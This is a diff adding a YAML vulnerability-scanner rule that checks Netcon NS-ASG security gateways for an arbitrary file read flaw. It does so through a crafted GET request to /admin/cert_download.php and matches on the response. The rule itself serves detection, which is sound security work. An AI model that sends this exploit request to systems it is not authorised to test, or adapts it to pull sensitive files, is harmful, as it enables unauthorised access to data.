@@ -1,0 +1,11 @@
+name: poc-yaml-ns-asg-file-read
+rules:
+  - method: GET
+    path: "/admin/cert_download.php?file=pqpqpqpq.txt&certfile=cert_download.php"
+    expression: |
+      response.status == 200 && response.body.bcontains(b"$certfile") && response.body.bcontains(b"application/pdf")
+detail:
+  author: YekkoY
+  description: "网康 NS-ASG安全网关 任意文件读取漏洞"
+  links:
+    - http://wiki.xypbk.com/Web%E5%AE%89%E5%85%A8/%E7%BD%91%E5%BA%B7%20NS-ASG%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3/%E7%BD%91%E5%BA%B7%20NS-ASG%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
